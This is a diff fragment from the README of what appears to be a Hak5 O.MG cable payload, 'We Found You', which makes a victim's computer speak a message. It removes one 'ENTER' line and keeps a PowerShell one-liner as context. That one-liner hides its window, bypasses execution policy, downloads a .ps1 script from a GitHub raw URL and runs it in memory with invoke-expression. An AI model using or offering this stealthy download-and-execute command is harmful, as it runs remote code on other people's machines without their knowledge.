@@ -41,7 +41,6 @@ And sapi speak with talk through their speakers the message provided or a custom
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl
-ENTER
 
 ```
 
